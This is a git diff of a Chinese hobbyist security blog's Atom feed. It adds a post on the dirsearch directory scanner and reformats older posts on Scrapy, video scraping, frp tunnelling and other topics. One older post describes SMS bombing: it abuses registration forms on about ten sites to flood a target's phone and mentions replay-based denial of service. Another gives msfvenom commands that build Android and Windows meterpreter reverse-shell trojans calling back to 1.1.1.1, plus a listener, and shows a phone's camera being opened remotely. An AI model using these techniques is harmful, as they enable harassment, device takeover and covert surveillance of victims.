@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://sixi.fun</id>
     <title>一只小菜鸡</title>
-    <updated>2019-07-02T08:53:55.209Z</updated>
+    <updated>2019-08-06T04:28:06.428Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://sixi.fun"/>
     <link rel="self" href="https://sixi.fun/atom.xml"/>
@@ -10,6 +10,29 @@
     <logo>https://sixi.fun/images/avatar.png</logo>
     <icon>https://sixi.fun/favicon.ico</icon>
     <rights>All rights reserved 2019, 一只小菜鸡</rights>
+    <entry>
+        <title type="html"><![CDATA[目录扫描工具dirsearch的使用]]></title>
+        <id>https://sixi.fun/post/mu-lu-sao-miao-gong-ju-dirsearch-de-shi-yong</id>
+        <link href="https://sixi.fun/post/mu-lu-sao-miao-gong-ju-dirsearch-de-shi-yong">
+        </link>
+        <updated>2019-08-06T03:44:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="简介">简介</h3>
+<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。下载地址：https://github.com/maurosoria/dirsearch</p>
+<h3 id="使用">使用</h3>
+<p>-u 指定url</p>
+<p>-e 指定网站语言</p>
+<p>-w 可以加上自己的字典（带上路径）</p>
+<p>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
+<p>--random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/dirsearch/1.png" alt=""><br>
+其中的db目录为字典数据库<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/dirsearch/2.png" alt=""><br>
+report目录为报告，存储扫描过的网站报告<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/dirsearch/3.png" alt=""></p>
+<p>通过返回状态码判断目录是否存在<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/dirsearch/4.png" alt=""></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[基于爬虫的短信轰炸思路]]></title>
         <id>https://sixi.fun/post/ji-yu-pa-chong-de-yan-zheng-ma-hong-zha-si-lu</id>
@@ -27,32 +50,32 @@
 <pre><code>+ requests模块
 + webdriver
 </code></pre>
-<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/1.png" alt="">
+<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/1.png" alt=""><br>
 这里采用这两个模块是因为某些网站利用requests模块的post方法的时候不好寻找表单数据，所以直接动用爬虫的终极杀手——webdriver。webdriver是一个可以直接用代码调用浏览器并进行操作的模块。鼠标键盘在浏览器上实现的操作都可以利用webdriver实现。</p>
 <h5 id="具体实现流程">具体实现流程</h5>
-<p>首先是寻找目标，利用浏览器高级搜索语法，输入intitle:注册   并搜索，效果如图：
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/2.png" alt="">
-在搜索结果中挑选比较容易构造数据包的网址，点击进入进行分析：
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/3.png" alt="">
-抓包分析，发现其提交的表单非常简单，只有如下几个参数
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/4.png" alt="">
-通过分析我们知道，post的地址里带有一串数字，其为随机数，所以在构造post地址的时候，利用random模块生成一个随机小数即可。然后我们构造post数据表单,代码如下
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/5.png" alt="">
-将电话号码以参数的形式传入函数，在调用时传入电话号码，就可以自动填充数据并post到服务器，当服务器收到正确的post请求后，就给目标号码发送短信。
-（整个函数）
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/6.png" alt="">
+<p>首先是寻找目标，利用浏览器高级搜索语法，输入intitle:注册   并搜索，效果如图：<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/2.png" alt=""><br>
+在搜索结果中挑选比较容易构造数据包的网址，点击进入进行分析：<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/3.png" alt=""><br>
+抓包分析，发现其提交的表单非常简单，只有如下几个参数<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/4.png" alt=""><br>
+通过分析我们知道，post的地址里带有一串数字，其为随机数，所以在构造post地址的时候，利用random模块生成一个随机小数即可。然后我们构造post数据表单,代码如下<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/5.png" alt=""><br>
+将电话号码以参数的形式传入函数，在调用时传入电话号码，就可以自动填充数据并post到服务器，当服务器收到正确的post请求后，就给目标号码发送短信。<br>
+（整个函数）<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/6.png" alt=""><br>
 可以看到，一个网站用非常简单的几行代码就可以发送一条短信</p>
 <p>某些网站针对这种方法进行了针对性的防御，比如在post表单中做手脚，或者post表单的数据不容易找清楚，这个时候我们无法构造正确的post表单就无法取得成功。那么这个时候就可以利用webdriver</p>
-<p>其原理是检查查看网页源码，通过查找需要点击的按钮、需要输入的对话框的class名字，或者id名字，利用 diver.find_element_by_id()、diver.find_element_by_class_name等函数进行定位，调用send_keys()函数进行输入，调用click()函数实现点击操作。
+<p>其原理是检查查看网页源码，通过查找需要点击的按钮、需要输入的对话框的class名字，或者id名字，利用 diver.find_element_by_id()、diver.find_element_by_class_name等函数进行定位，调用send_keys()函数进行输入，调用click()函数实现点击操作。<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/7.png" alt=""></p>
-<p>以上就是实现post操作的方法，将正确的数据post到相应地址便可以向目标电话号码发送短信。
-这里为了测试我写了十个网站的方法，并将其封装成一个个函数，通过面向对象的方式编程，然后调用。
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/8.png" alt="">
-在run函数中加入了异常处理，防止个别网站报错从而导致程序终止。在调用时循环10次。
-测试如图：
+<p>以上就是实现post操作的方法，将正确的数据post到相应地址便可以向目标电话号码发送短信。<br>
+这里为了测试我写了十个网站的方法，并将其封装成一个个函数，通过面向对象的方式编程，然后调用。<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/8.png" alt=""><br>
+在run函数中加入了异常处理，防止个别网站报错从而导致程序终止。在调用时循环10次。<br>
+测试如图：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/9.png" alt=""></p>
 <h4 id="结束">结束</h4>
-<p>到此，爬虫实现短信轰炸的思路已经明确了，因为只是验证想法测试是否可行，所以没数量比较少。有一句话叫做量变引起质变。
+<p>到此，爬虫实现短信轰炸的思路已经明确了，因为只是验证想法测试是否可行，所以没数量比较少。有一句话叫做量变引起质变。<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/SMS_Bombing/10.jfif" alt=""></p>
 <h4 id="拓展">拓展</h4>
 <pre><code>	 逛论坛偶然在先知社区看到一篇短信轰炸的帖子，那个思路还比这更好，其并没有用代码实现，而是实验了利用brupsuit抓包，并重复的向网站进行发包，相当于利用重放攻击进行轰炸，只需要找到几个没有做这方面防御的网站，写个循环不断的发包，便可以向目标电话发送大量短信形成拒绝服务攻击。由于还没了解应如何利用代码模拟burpsuit的重放功能，暂时不将这个内容放上来，先在这里记录下来，以后实现了再写一篇博客记录过程。
@@ -67,24 +90,24 @@
         <updated>2019-06-24T07:07:14.000Z</updated>
         <content type="html"><![CDATA[<h3 id="pipelines模块的使用">pipelines模块的使用</h3>
 <h4 id="同一个项目下爬取多个网站">同一个项目下爬取多个网站</h4>
-<p>首先创建多个spider
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/1.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/2.png" alt="">
-在每个spider中写不同的爬取规则得到数据
-然后在每条数据的item中添加一个键值用于pipelines判断数据来自哪个网站，以便选用不同的pipelines进行数据的处理
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/3.png" alt="">
-写多个pipeline，判断数据来自哪里，然后用不同的pipeline处理不同网站的数据
+<p>首先创建多个spider<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/1.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/2.png" alt=""><br>
+在每个spider中写不同的爬取规则得到数据<br>
+然后在每条数据的item中添加一个键值用于pipelines判断数据来自哪个网站，以便选用不同的pipelines进行数据的处理<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/3.png" alt=""><br>
+写多个pipeline，判断数据来自哪里，然后用不同的pipeline处理不同网站的数据<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/4.png" alt=""></p>
 <h3 id="logging模块的使用">logging模块的使用</h3>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/5.png" alt=""></p>
 <h4 id="scrapy中logging模块的使用">scrapy中logging模块的使用</h4>
-<p>在spider中import模块，然后调用模块的getLogger方法传入name  这里的name默认为py文件的名字。
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/7.png" alt="">
-在方法中调用logger记录日志
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/8.png" alt="">
-在pipelines中调用方法一样
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/6.png" alt="">
-若要将log保存到本地，只需在setting中添加LOG_FILE属性
+<p>在spider中import模块，然后调用模块的getLogger方法传入name  这里的name默认为py文件的名字。<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/7.png" alt=""><br>
+在方法中调用logger记录日志<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/8.png" alt=""><br>
+在pipelines中调用方法一样<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/6.png" alt=""><br>
+若要将log保存到本地，只需在setting中添加LOG_FILE属性<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/scrpy2/9.png" alt=""></p>
 ]]></content>
     </entry>
@@ -98,20 +121,20 @@
 <pre><code> Scrapy是用纯Python实现一个为了爬取网站数据、提取结构性数据而编写的应用框架，用途非常广泛。框架的力量，用户只需要定制开发几个模块就可以轻松的实现一个爬虫，用来抓取网页内容以及各种图片，非常之方便。Scrapy 使用了 Twisted(其主要对手是Tornado)异步网络框架来处理网络通讯，可以加快我们的下载速度，不用自己去实现异步框架，并且包含了各种中间件接口，可以灵活的完成各种需求
 </code></pre>
 <h3 id="框架实现流程图">框架实现流程图</h3>
-<p>实现流程：
+<p>实现流程：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/scrpy_liu.png" alt=""></p>
-<p>实现过程：
+<p>实现过程：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/xiangjie.png" alt=""></p>
 <h3 id="创建一个scrapy项目">创建一个scrapy项目</h3>
-<p>流程
+<p>流程<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/0.png" alt=""></p>
-<p>安装模块
+<p>安装模块<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/anzhuang.png" alt=""></p>
-<p>windows下的python也要进行命令行安装。
+<p>windows下的python也要进行命令行安装。<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/1.png" alt=""></p>
-<p>1、 创建一个项目：scrapy startproject scrapy_spider
+<p>1、 创建一个项目：scrapy startproject scrapy_spider<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/2.png" alt=""></p>
-<p>打开pycharm，可以看到创建成功
+<p>打开pycharm，可以看到创建成功<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/3.png" alt=""></p>
 <ul>
 <li>Item定义爬取的字段</li>
@@ -120,44 +143,44 @@
 <li>settings 爬虫的设置</li>
 <li>spiders文件夹 创建的爬虫</li>
 </ul>
-<p>2、生成一个爬虫
+<p>2、生成一个爬虫<br>
 scrapy genspider spider1 &quot;itcast.cn&quot;</p>
 <ul>
 <li>spider1 爬虫名字</li>
-<li>itcast.cn 爬虫范围（域名）
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/4.png" alt="">
-查看spider文件夹下有了一个名为spider1的爬虫
+<li>itcast.cn 爬虫范围（域名）<br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/4.png" alt=""><br>
+查看spider文件夹下有了一个名为spider1的爬虫<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/5.png" alt=""></li>
 </ul>
-<p>spider1内容如下：
+<p>spider1内容如下：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/6.png" alt=""></p>
 <ul>
 <li>start_url内容为生成的，按需修改</li>
 <li>parse函数用于处理start_url的响应</li>
 </ul>
-<p>现在假设要爬取http://www.itcast.cn/channel/teacher.shtml下的所有教师的信息
-打开浏览器对其进行分析
+<p>现在假设要爬取http://www.itcast.cn/channel/teacher.shtml下的所有教师的信息<br>
+打开浏览器对其进行分析<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/7.png" alt=""></p>
-<p>书写xpath进行提取：
+<p>书写xpath进行提取：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/12.png" alt=""></p>
 <ul>
 <li>extract()函数提取文本</li>
 <li>yield item将数据传入piplines.py处理</li>
 </ul>
-<p>piplines接收数据，处理
+<p>piplines接收数据，处理<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/13.png" alt=""></p>
-<p>同时要在settings里面开启piplines才能使用
+<p>同时要在settings里面开启piplines才能使用<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/14.png" alt=""></p>
 <ul>
-<li>300表示距离引擎的距离，如果数值越小，则表示数据越先经过这个管道。
+<li>300表示距离引擎的距离，如果数值越小，则表示数据越先经过这个管道。<br>
 eg:再定义一个管道  距离为301，则数据先经过300处理，再经过301处理。</li>
 </ul>
-<p>设置日志等级
+<p>设置日志等级<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/9.png" alt=""></p>
-<p>运行报错，没有这个模块，安装相应模块
+<p>运行报错，没有这个模块，安装相应模块<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/11.png" alt=""></p>
-<p>处理完问题，再次运行，得到所要爬取的数据：
-启动爬虫 scrapy crawl spider1
+<p>处理完问题，再次运行，得到所要爬取的数据：<br>
+启动爬虫 scrapy crawl spider1<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/Scrapy/15.png" alt=""></p>
 ]]></content>
     </entry>
@@ -173,25 +196,25 @@ eg:再定义一个管道  距离为301，则数据先经过300处理，再经过
 <h4 id="历程">历程</h4>
 <pre><code>  期初有想法是完全不会的，之前学习的语法也忘了，因为python是零零星星在学，没有一次系统的学习过。于是找到了一套完整的python全栈开发视频，将里面的爬虫模块的技术看了一半，便开始编写，由于只能在机房才能连上服务器，来回机房跑了几次，另外花了几节课才调试出来。其中还有许多不足，等技术成熟了再优化代码。
 </code></pre>
-<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/2.png" alt="">
+<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/2.png" alt=""><br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/3.png" alt=""></p>
 <h4 id="代码">代码</h4>
 <pre><code>代码思路和实现过程，在面向对象的类里写的很清楚，就不阐述了。运用的模块也蛮简单，就requests请求模块，随机数模块random（），用于随机选择用户，登录获取用户登录信息的cookie，存在session对象中。实现用户的分布式爬取，反反爬虫。 用etree模块处理响应的数据，并用xpath提取下一步所需的信息，保存到列表中以供下一步访问。os模块用于创建课程相应文件夹和每一小节的名字并存储到相应文件夹。
 </code></pre>
 <h5 id="面向对象">面向对象</h5>
 <p><strong><a href="https://github.com/LCCL52/code_python/blob/master/e%20chunqiu.py">源码地址</a></strong></p>
-<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code1.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code2.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code3.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code4.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code5.png" alt="">
+<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code1.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code2.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code3.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code4.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code5.png" alt=""><br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code6.png" alt=""></p>
 <p>以上代码是面向对象过程，但是在运行过程中有些问题导致报错，还没解决。但是思路是完全正确的，花了些时间把代码改成非面向对象版，代码完美运行：</p>
 <h4 id="非面向对象版代码">非面向对象版代码</h4>
 <p><strong><a href="https://github.com/LCCL52/code_python/blob/master/test.py">源码地址</a></strong></p>
-<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code7.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code8.png" alt="">
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code9.png" alt="">
+<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code7.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code8.png" alt=""><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code9.png" alt=""><br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code10.png" alt=""></p>
 <pre><code>当然，虽然此次爬取到了所想要的资源，但是以上代码也有许多地方可以优化，如可以使用多线程，多进程技术进行爬取，在实际互联网上还要增加用户代理池，ip代理池等反反爬技术，以成功爬取所需的全部资源。美中不足的是本来想将网页一并爬取下来，但是如何处理每一张图片与连接的对应关系还没有思路，一个要学会了教程里的nosql数据库才能处理，所以这个问题先放一边。总共爬取了10个G的全部教学视频，收获还是不错的。
 </code></pre>
@@ -223,17 +246,17 @@ eg:再定义一个管道  距离为301，则数据先经过300处理，再经过
 <h3 id="选购云服务器">选购云服务器：</h3>
 <p>考虑到低延迟等特性，买一台国内普通的云主机就可以了。云主机的话腾讯云有学生特惠价，蛮便宜的。本次是在Ubantu下面搭建的，所以购买好以后，安装一个Ubantu系统即可。</p>
 <h3 id="安装终端">安装终端：</h3>
-<p>安装MobaXterm远程连接主机，再开一个窗口连接本地虚拟机，以方便操作。
-界面如下：
+<p>安装MobaXterm远程连接主机，再开一个窗口连接本地虚拟机，以方便操作。<br>
+界面如下：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/zhongduan.png" alt=""></p>
 <h3 id="环境搭建">环境搭建</h3>
-<p>frp:本地主机网络与云主机的映射；
-frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称frps
+<p>frp:本地主机网络与云主机的映射；<br>
+frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称frps<br>
 frpc客户机,kali 2.0为例,能访问互联网,后文简称frpc</p>
 <h4 id="云主机配置">云主机配置：</h4>
-<p>下载frp
-Github项目地址:https://github.com/fatedier/frp
-找到最新的releases下载，系统版本自行确认。
+<p>下载frp<br>
+Github项目地址:https://github.com/fatedier/frp<br>
+找到最新的releases下载，系统版本自行确认。<br>
 以下为云主机终端命令：</p>
 <p>1、wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
 <p>2、tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
@@ -241,32 +264,32 @@ Github项目地址:https://github.com/fatedier/frp
 <p>4、rm -rf frpc*</p>
 <h5 id="编写frps配置文件">编写frps配置文件</h5>
 <p>vi frps.ini</p>
-<p>内容如下：
+<p>内容如下：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/vim.png" alt=""></p>
 <p>运行frps</p>
-<p>运行frps,-c参数用于指定配置文件,在同级目录下的话 可以直接运行.frps
+<p>运行frps,-c参数用于指定配置文件,在同级目录下的话 可以直接运行.frps<br>
 ./frps -c ./frps.ini</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p3.png" alt=""></p>
 <h3 id="kali的配置">Kali的配置</h3>
-<p>配置SSH
-允许root远程登陆
+<p>配置SSH<br>
+允许root远程登陆<br>
 编辑ssh配置文件/etc/ssh/sshd_config</p>
 <p><code>root@kali:~ vim /etc/ssh/sshd_config</code></p>
-<p>在配置文件第一行前添加如下语句:
-<code>PermitRootLogin yes</code>
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p4.png" alt="">
+<p>在配置文件第一行前添加如下语句:<br>
+<code>PermitRootLogin yes</code><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p4.png" alt=""><br>
 重启SSH并设置为开机自启</p>
-<p><code>root@kali:~ systemctl restart ssh</code>
+<p><code>root@kali:~ systemctl restart ssh</code><br>
 <code>root@kali:~ systemctl enable ssh</code></p>
-<p>验证SSH
-本地使用终端连接虚拟机中的Kali，测试能否连接成功:
+<p>验证SSH<br>
+本地使用终端连接虚拟机中的Kali，测试能否连接成功:<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p5.png" alt=""></p>
 <h4 id="下载frp">下载frp</h4>
-<p>root@thp3:~#
+<p>root@thp3:~#<br>
 wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
 <p>root@thp3:~# tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
 <p>root@thp3:~# cd frp_0.27.0_linux_amd64/</p>
-<p>root@thp3:~#~/frp_0.27.0_linux_amd64&gt; rm -rf frps*</p>
+<p>root@thp3:<sub>#</sub>/frp_0.27.0_linux_amd64&gt; rm -rf frps*</p>
 <h4 id="编写frpc配置文件">编写frpc配置文件</h4>
 <p>root@thp3:~# cd frp_0.27.0_linux_amd64/ vi frpc.ini</p>
 <p>内容如下:</p>
@@ -278,17 +301,17 @@ wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_
 <h3 id="msf反向shell测试">msf反向shell测试</h3>
 <p>现在来进行Metasploit下最基本的反向shell测试，看看能不能成功建立会话连接。</p>
 <h4 id="生成payload">生成Payload</h4>
-<p>使用msfvenom生成安卓手机APP木马
+<p>使用msfvenom生成安卓手机APP木马<br>
 <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 R &gt; /lol.apk</code></p>
 <p>使用msfvenom生成exe木马</p>
-<p><code>root@kali:~&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe &gt; sqlsec.exe</code>
+<p><code>root@kali:~&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe &gt; sqlsec.exe</code><br>
 *注意：这里的1.1.1.1是外网云主机的IP地址，2333是映射到外网的端口，并且要将云主机的相应端口打开，如图：</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/server.png" alt=""></p>
-<p>添加frpc规则
+<p>添加frpc规则<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p6.png" alt=""></p>
-<p>将Kali的4444端口转发到外网1.1.1.1的2333端口。
-运行frps和frpc
-分别在云主机和Kali下运行frps和frpc
+<p>将Kali的4444端口转发到外网1.1.1.1的2333端口。<br>
+运行frps和frpc<br>
+分别在云主机和Kali下运行frps和frpc<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p8.png" alt=""></p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p9.png" alt=""></p>
 <h4 id="msf监听反弹的shell">msf监听反弹的shell</h4>
@@ -320,9 +343,9 @@ msf5 exploit(multi/handler) &gt; run
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p12.jpg" alt=""></p>
 <p>手机安装：</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p10.jpg" alt=""></p>
-<p>测试远程打开目标主机摄像头：
+<p>测试远程打开目标主机摄像头：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p11.jpg" alt=""></p>
-<p>在ssh连接时要打开云主机的相应端口：如
+<p>在ssh连接时要打开云主机的相应端口：如<br>
 由于测试时没搭建博客，部分图片不全。</p>
 <hr>
 <p>革命尚未成功，同志仍需努力..............</p>
